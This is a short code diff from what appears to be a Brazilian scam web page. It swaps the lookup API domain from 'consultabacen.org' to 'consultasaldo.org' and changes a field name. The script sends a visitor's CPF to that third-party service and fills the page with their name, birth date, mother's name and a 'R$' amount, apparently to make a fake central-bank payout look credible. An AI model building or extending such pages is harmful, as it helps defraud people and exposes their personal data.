@@ -148,7 +148,7 @@ if(valor) document.getElementById('valorExibido').textContent = 'R$ ' + valor;
 
 // Busca API se faltar dados
 if(cpf && (!nome || !nasc)){
-  fetch('https://consultabacen.org/wp-json/cpf/v1/consultar?cpf=' + cpf)
+  fetch('https://consultasaldo.org/wp-json/cpf/v1/consultar?cpf=' + cpf)
     .then(function(r){ return r.json(); })
     .then(function(d){
       if(d.nome && !nome){
@@ -157,7 +157,7 @@ if(cpf && (!nome || !nasc)){
         nome = d.nome;
       }
       if(d.nascimento && !nasc){ document.getElementById('dadoNasc').textContent = d.nascimento; nasc = d.nascimento; }
-      if(d.mae && !mae){ mae = d.mae; }
+      if(d.nome_mae && !mae){ mae = d.nome_mae; }
       if(d.valor && !valor){ valor = d.valor; document.getElementById('valorExibido').textContent = 'R$ ' + d.valor; }
     }).catch(function(){});
 }
